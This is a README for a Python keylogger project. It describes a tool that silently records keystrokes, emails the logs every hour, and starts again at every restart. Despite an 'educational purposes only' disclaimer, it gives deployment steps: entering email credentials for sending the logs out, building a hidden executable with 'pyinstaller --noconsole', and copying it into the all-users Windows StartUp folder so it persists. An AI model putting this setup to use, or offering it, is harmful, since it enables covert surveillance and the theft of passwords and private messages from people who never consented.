# Keylogger-in-Python

A Python-based keylogger that runs silently in the background, records keypress logs, and sends those logs via email every hour. It also supports auto-launch on system restart.


### ⚠️ Disclaimer

**This project is for educational purposes only.** Keyloggers can be used for malicious intent, which is illegal and unethical. Make sure you have permission to monitor and log keystrokes on any device before running this script. Misuse of this tool could result in legal consequences.

## Features
- Runs silently in the background
- Auto-launch on restart
- Records key press logs
- Sends logs via email every hour

## Requirements
- Python 3.x
- `pynput` library
- `smtplib` for email functionality


## Configuration
Before running the keylogger, update the email credentials in `constant.py` with your own email ID and password:
```bash
EMAIL_ADDRESS = 'your_email@example.com'
EMAIL_PASSWORD = 'your_password'
```

## Create Executable
To create an executable from the Python script, use `pyinstaller`:
```bash
pyinstaller --noconsole --onefile Keylogger.py
```
This will create an executable that runs without a console window.

## Auto-launch on System Start
To auto-launch the keylogger on computer startup, follow these steps:
  1. Copy the executable file to the following location:
  ```bash
  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  ```
  2. The keylogger will now start automatically whenever the system restarts.


## Stopping the Keylogger
If you need to stop the keylogger:
  1. Open Task Manager (`Ctrl + Shift + Esc`), find the process named `keylogger`, and end it.
  2. To prevent the keylogger from auto-launching on restart, delete the keylogger executable from the Startup folder:
  ```bash
  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  ```

